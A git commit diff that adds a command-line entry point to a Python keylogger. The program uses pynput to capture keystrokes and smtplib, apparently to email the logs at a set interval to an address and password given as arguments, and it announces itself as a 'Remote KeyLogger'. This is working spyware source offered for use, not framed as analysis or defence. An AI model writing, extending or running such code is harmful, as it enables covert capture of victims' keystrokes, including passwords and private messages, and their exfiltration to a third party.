4942e8a2200740af509a22385751641298e6246d
ysthakur <45539777+ysthakur@users.noreply.github.com>
2024-12-02 22:04:19 -0500

    Move rlogger.py into keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+import argparse
 import pynput.keyboard
 import threading
 import smtplib
@@ -42,3 +43,15 @@ class Keylogger:
         with keyboard_listener:
             self.report()
             keyboard_listener.join()
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--time',type=int, help = "time interval required seconds like -t 60", required=True)
+parser.add_argument('--mail', help = "Mail requrired to Report for keylogs", required=True)
+parser.add_argument('--password', help = "mail account password required",required=True)
+args = parser.parse_args()
+time = args.time
+mail = args.mail
+password = args.password
+print("Remote KeyLogger Running....")
+my_keylogger = Keylogger(time, mail, password)
+my_keylogger.start()
